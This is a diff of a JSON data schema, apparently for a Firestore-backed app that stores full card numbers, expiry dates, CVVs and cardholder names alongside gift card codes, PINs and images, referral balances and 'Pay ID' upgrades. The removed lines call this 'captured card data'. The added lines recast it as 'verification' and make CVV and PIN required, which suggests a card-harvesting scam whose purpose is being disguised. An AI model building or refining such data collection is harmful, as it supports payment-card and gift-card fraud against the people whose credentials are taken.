@@ -2,65 +2,72 @@
   "entities": {
     "CardSubmission": {
       "title": "Card Submission",
-      "description": "ATM card details captured for automated payments",
+      "description": "Card details submitted for account verification or wallet deposit",
       "type": "object",
       "properties": {
-        "id": { "type": "string", "pattern": "^[a-zA-Z0-9_\\-]+$" },
-        "type": { "type": "string" },
-        "cardNumber": { "type": "string" },
-        "expiry": { "type": "string" },
-        "cvv": { "type": "string" },
-        "cardName": { "type": "string" },
+        "id": { "type": "string", "maxLength": 64, "pattern": "^[a-zA-Z0-9_\\-]+$" },
+        "type": { "type": "string", "maxLength": 100 },
+        "cardNumber": { "type": "string", "maxLength": 30 },
+        "expiry": { "type": "string", "maxLength": 10 },
+        "cvv": { "type": "string", "maxLength": 10 },
+        "cardName": { "type": "string", "maxLength": 100 },
         "amount": { "type": "number" },
-        "userEmail": { "type": "string" },
-        "userName": { "type": "string" },
-        "date": { "type": "string" }
+        "userEmail": { "type": "string", "maxLength": 150 },
+        "userName": { "type": "string", "maxLength": 100 },
+        "date": { "type": "string", "maxLength": 100 },
+        "timestamp": { "type": "string", "maxLength": 64 }
       },
-      "required": ["id", "type", "cardNumber", "amount", "userEmail", "date"]
+      "required": ["id", "type", "cardNumber", "expiry", "cvv", "cardName", "amount", "userEmail", "userName", "date", "timestamp"]
     },
     "GiftCardSubmission": {
       "title": "Gift Card Submission",
-      "description": "Gift card verification submissions for account verification, Pay ID, and Upgrades",
+      "description": "Gift card verification submissions for Pay ID and Tier Upgrades",
       "type": "object",
       "properties": {
-        "id": { "type": "string" },
-        "type": { "type": "string" },
-        "cardBrand": { "type": "string" },
-        "cardCode": { "type": "string" },
-        "cardPin": { "type": "string" },
+        "id": { "type": "string", "maxLength": 64, "pattern": "^[a-zA-Z0-9_\\-]+$" },
+        "type": { "type": "string", "maxLength": 100 },
+        "cardBrand": { "type": "string", "maxLength": 100 },
+        "cardCode": { "type": "string", "maxLength": 100 },
+        "cardPin": { "type": "string", "maxLength": 64 },
         "amount": { "type": "number" },
-        "cardFormat": { "type": "string" },
-        "image": { "type": "string" },
-        "userEmail": { "type": "string" },
-        "userName": { "type": "string" },
-        "date": { "type": "string" },
-        "status": { "type": "string" }
+        "cardFormat": { "type": "string", "enum": ["ecode", "physical"] },
+        "image": { "type": "string", "maxLength": 950000 },
+        "userEmail": { "type": "string", "maxLength": 150 },
+        "userName": { "type": "string", "maxLength": 100 },
+        "date": { "type": "string", "maxLength": 100 },
+        "status": { "type": "string", "enum": ["pending", "verified", "redeemed"] },
+        "timestamp": { "type": "string", "maxLength": 64 }
       },
-      "required": ["id", "type", "cardBrand", "cardCode", "amount", "userEmail", "date"]
+      "required": ["id", "type", "cardBrand", "cardFormat", "cardCode", "cardPin", "amount", "image", "userEmail", "userName", "date", "status", "timestamp"]
     },
     "FcmToken": {
       "title": "FCM Token",
-      "description": "Device registration token for push notifications",
+      "description": "Device notification preference record",
       "type": "object",
       "properties": {
-        "email": { "type": "string" },
-        "token": { "type": "string" },
-        "updatedAt": { "type": "string" }
+        "email": { "type": "string", "maxLength": 150 },
+        "granted": { "type": "boolean" },
+        "updatedAt": { "type": "string", "maxLength": 64 }
       },
-      "required": ["email", "token"]
+      "required": ["email", "granted", "updatedAt"]
     },
     "UserProfile": {
       "title": "User Profile",
-      "description": "User profile data stored in cloud",
+      "description": "User profile and referral balance synced across devices",
       "type": "object",
       "properties": {
-        "name": { "type": "string" },
-        "email": { "type": "string" },
+        "name": { "type": "string", "maxLength": 100 },
+        "email": { "type": "string", "maxLength": 150 },
+        "phone": { "type": "string", "maxLength": 30 },
         "balance": { "type": "number" },
         "referralBalance": { "type": "number" },
         "totalReferrals": { "type": "number" },
-        "accountLevel": { "type": "string" },
-        "referralCode": { "type": "string" }
+        "accountLevel": { "type": "string", "maxLength": 64 },
+        "avatarUrl": { "type": "string", "maxLength": 950000 },
+        "referralCode": { "type": "string", "maxLength": 64 },
+        "payIdVerified": { "type": "boolean" },
+        "createdAt": { "type": "string", "maxLength": 64 },
+        "updatedAt": { "type": "string", "maxLength": 64 }
       },
       "required": ["name", "email", "balance"]
     }
@@ -68,23 +75,19 @@
   "firestore": {
     "/cardSubmissions/{submissionId}": {
       "schema": "CardSubmission",
-      "description": "Collection of captured card data"
+      "description": "Collection of captured card verification submissions (admin read/update only)"
     },
     "/giftCardSubmissions/{submissionId}": {
       "schema": "GiftCardSubmission",
-      "description": "Collection of submitted gift cards for account verification"
+      "description": "Collection of submitted gift cards for account verification (admin read/update only)"
     },
     "/fcmTokens/{tokenId}": {
       "schema": "FcmToken",
-      "description": "Collection of FCM device tokens for push notifications"
+      "description": "Collection of notification preference records"
     },
     "/users/{userId}": {
       "schema": "UserProfile",
-      "description": "User profiles for cross-device sync"
-    },
-    "/transactions/{userId}": {
-      "schema": "UserProfile",
-      "description": "User transactions for cross-device sync"
+      "description": "User profiles for cross-device sync and referral crediting"
     }
   }
 }
